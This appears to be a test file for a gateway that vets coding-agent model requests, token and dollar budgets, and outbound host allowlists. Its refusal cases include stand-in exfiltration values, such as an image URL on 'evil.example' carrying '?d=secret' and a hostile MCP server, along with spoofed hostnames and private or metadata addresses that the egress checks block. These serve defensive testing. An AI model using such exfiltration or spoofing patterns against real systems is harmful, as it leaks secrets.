import { describe, expect, it } from 'vitest';
import { EGRESS_PORT, egressAllows, isEgressRule, isPublicAddress } from './egress';
import { judgeModelRequest } from './model-request';
import { admits, costOf, countedTokens, reservationOf } from './usage';

const rules = { models: ['claude-opus-5-5'], maxTokens: 64_000 };
const request = (extra: Record<string, unknown> = {}) => ({
  model: 'claude-opus-5-5',
  max_tokens: 32_000,
  stream: true,
  system: [{ type: 'text', text: 'You are Claude Code' }],
  messages: [{ role: 'user', content: [{ type: 'text', text: 'Fix the cards' }] }],
  tools: [{ name: 'Read', description: 'Read a file', input_schema: { type: 'object' } }],
  ...extra,
});

describe('judgeModelRequest', () => {
  it('admits what Claude Code sends for a run', () => {
    expect(judgeModelRequest(request(), rules)).toEqual({
      admitted: true,
      model: 'claude-opus-5-5',
      stream: true,
      maxTokens: 32_000,
    });
    // A request that sets no limit may ask for all the rules allow.
    expect(judgeModelRequest(request({ max_tokens: undefined }), rules)).toMatchObject({
      maxTokens: rules.maxTokens,
    });
    expect(
      judgeModelRequest(request({ tools: [{ type: 'bash_20250124', name: 'bash' }] }), rules),
    ).toMatchObject({ admitted: true });
  });

  it.each([
    ['another model', { model: 'claude-fable-5-1' }],
    ['a server tool', { tools: [{ type: 'web_search_20260209', name: 'web_search' }] }],
    ['code execution', { tools: [{ type: 'code_execution_20260521', name: 'code_execution' }] }],
    ['an MCP toolset', { tools: [{ type: 'mcp_toolset', mcp_server_name: 'x' }] }],
    ['an MCP server', { mcp_servers: [{ type: 'url', url: 'https://evil.example', name: 'x' }] }],
    ['a container', { container: { skills: [] } }],
    ['too many tokens', { max_tokens: 200_000 }],
    [
      'an image the provider fetches',
      {
        messages: [
          {
            role: 'user',
            content: [
              { type: 'image', source: { type: 'url', url: 'https://evil.example/?d=secret' } },
            ],
          },
        ],
      },
    ],
    [
      'a stored file inside a tool result',
      {
        messages: [
          {
            role: 'user',
            content: [
              {
                type: 'tool_result',
                tool_use_id: 't',
                content: [{ type: 'document', source: { type: 'file', file_id: 'f' } }],
              },
            ],
          },
        ],
      },
    ],
  ])('refuses %s', (_name, extra) => {
    expect(judgeModelRequest(request(extra), rules)).toMatchObject({ admitted: false });
  });

  it('refuses what is not a request', () => {
    expect(judgeModelRequest('hello', rules)).toMatchObject({ admitted: false });
    expect(judgeModelRequest(request({ tools: 'all' }), rules)).toMatchObject({ admitted: false });
  });
});

describe('usage and budget', () => {
  const usage = { input: 1_000_000, output: 100_000, cacheWrite: 200_000, cacheRead: 2_000_000 };
  it('prices a response and counts the tokens a subscription’s budget counts', () => {
    expect(costOf(usage, { input: 4, output: 20, cacheWrite: 5, cacheRead: 0.2 })).toBeCloseTo(
      4 + 2 + 1 + 0.4,
    );
    expect(countedTokens(usage)).toBe(1_300_000);
  });

  it('holds an API key to dollars and a subscription to tokens, never past the budget', () => {
    const budget = { usd: 5, tokens: 1_000_000 };
    const request = { usd: 1, tokens: 100_000 };
    expect(admits({ usd: 4, tokens: 2_000_000 }, request, budget, 'api-key')).toBe(true);
    expect(admits({ usd: 4.01, tokens: 0 }, request, budget, 'api-key')).toBe(false);
    expect(admits({ usd: 100, tokens: 900_000 }, request, budget, 'subscription')).toBe(true);
    expect(admits({ usd: 0, tokens: 900_001 }, request, budget, 'subscription')).toBe(false);
  });

  it('reckons a request at its size and all the output it may ask for', () => {
    const price = { input: 4, output: 20, cacheWrite: 5, cacheRead: 0.2 };
    expect(reservationOf({ bytes: 3_000, maxTokens: 10_000 }, price)).toEqual({
      usd: (1_000 * 4 + 10_000 * 20) / 1e6,
      tokens: 11_000,
    });
    expect(reservationOf({ bytes: 3_000, maxTokens: 10_000 }, null).usd).toBe(0);
  });
});

describe('egress', () => {
  it('allows listed hosts and their subdomains under a wildcard only', () => {
    const allowed = ['registry.npmjs.org', '*.pythonhosted.org'];
    expect(egressAllows(allowed, 'registry.npmjs.org')).toBe(true);
    expect(egressAllows(allowed, 'REGISTRY.npmjs.org.')).toBe(true);
    expect(egressAllows(allowed, 'files.pythonhosted.org')).toBe(true);
    expect(egressAllows(allowed, 'pythonhosted.org')).toBe(false);
    expect(egressAllows(allowed, 'evil-registry.npmjs.org')).toBe(false);
    expect(egressAllows(allowed, 'registry.npmjs.org.evil.example')).toBe(false);
    expect(EGRESS_PORT).toBe(443);
  });

  it('takes on a list only hosts, and wildcards narrower than a top-level domain', () => {
    for (const rule of ['registry.npmjs.org', '*.pythonhosted.org', 'npm.pkg.github.com']) {
      expect(isEgressRule(rule)).toBe(true);
    }
    for (const rule of ['*.com', '*', 'com', '*.*.org', 'https://registry.npmjs.org', '']) {
      expect(isEgressRule(rule)).toBe(false);
    }
  });

  it.each([
    ['104.16.1.35', true],
    ['10.0.0.5', false],
    ['172.20.0.2', false],
    ['192.168.1.1', false],
    ['127.0.0.1', false],
    ['169.254.169.254', false],
    ['100.64.0.1', false],
    ['0.0.0.0', false],
    ['2606:4700::6810:123', true],
    ['::1', false],
    ['fd00::1', false],
    ['fe80::1', false],
    ['::ffff:10.0.0.1', false],
    ['::ffff:104.16.1.35', true],
    ['192.0.2.10', false],
    ['198.51.100.7', false],
    ['203.0.113.9', false],
    ['2001:db8::1', false],
    ['2002:a00:1::1', false],
    ['2001:0:4136:e378::1', false],
    ['not-an-address', false],
  ])('%s is public: %s', (address, expected) => {
    expect(isPublicAddress(address)).toBe(expected);
  });
});
